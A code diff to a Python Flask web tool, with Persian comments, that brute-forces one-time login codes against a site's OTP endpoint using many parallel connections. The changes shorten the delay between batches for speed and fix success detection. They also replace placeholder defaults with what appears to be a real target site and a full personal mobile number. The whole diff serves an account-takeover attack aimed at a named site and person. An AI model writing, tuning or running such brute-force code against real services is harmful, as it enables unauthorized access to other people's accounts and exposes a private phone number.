@@ -154,7 +154,10 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
 
     for batch_start in range(start_range, end_range, batch_size):
         if not running or found_success:
-            progress_log.append("Process stopped manually or due to success!")
+            if found_success:
+                progress_log.append("Stopping: Successful code found!")
+            else:
+                progress_log.append("Process stopped manually!")
             socketio.emit('update_progress', {'log': progress_log[-1]})
             break
 
@@ -174,13 +177,13 @@ def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_
                         running = False
                         progress_log.append("Process stopped because a successful code was found!")
                         socketio.emit('update_progress', {'log': progress_log[-1]})
-                        break
+                        break  # از حلقه داخلی هم خارج می‌شیم
                 except Exception as e:
                     progress_log.append(f"Exception in future: {str(e)}")
                     socketio.emit('update_progress', {'log': progress_log[-1]})
 
         if not found_success:
-            time.sleep(0.5)
+            time.sleep(0.1)  # تأخیر خیلی کم برای سرعت بیشتر
 
     if not found_success:
         progress_log.append(f"No successful code found in range {start_range:05d}-{end_range:05d}.")
@@ -209,7 +212,7 @@ def index():
             <form id="form" class="space-y-4">
                 <div>
                     <label class="block text-sm font-medium text-gray-700">هاست:</label>
-                    <input type="text" id="host" class="mt-1 block w-full p-2 border rounded" value="www.host.com">
+                    <input type="text" id="host" class="mt-1 block w-full p-2 border rounded" value="www.arzanpanel-iran.com">
                 </div>
                 <div>
                     <label class="block text-sm font-medium text-gray-700">Nonce:</label>
@@ -217,7 +220,7 @@ def index():
                 </div>
                 <div>
                     <label class="block text-sm font-medium text-gray-700">شماره موبایل:</label>
-                    <input type="text" id="mobile" class="mt-1 block w-full p-2 border rounded" value="0914">
+                    <input type="text" id="mobile" class="mt-1 block w-full p-2 border rounded" value="09039495749">
                 </div>
                 <div>
                     <label class="block text-sm font-medium text-gray-700">تعداد کانکشن‌ها:</label>
@@ -330,7 +333,7 @@ def index():
 
 @app.route('/start', methods=['POST'])
 def start():
-    global running, progress_log
+    global running, progress_log, found_success
     data = request.get_json()
     host = data['host']
     login_otp_nonce = data['nonce']
@@ -340,6 +343,7 @@ def start():
     end_range = int(data['endRange'])
 
     running = True
+    found_success = False  # ریست کردن برای استارت جدید
     progress_log = []
     progress_log.append("Start button clicked!")
     socketio.emit('update_progress', {'log': progress_log[-1]})
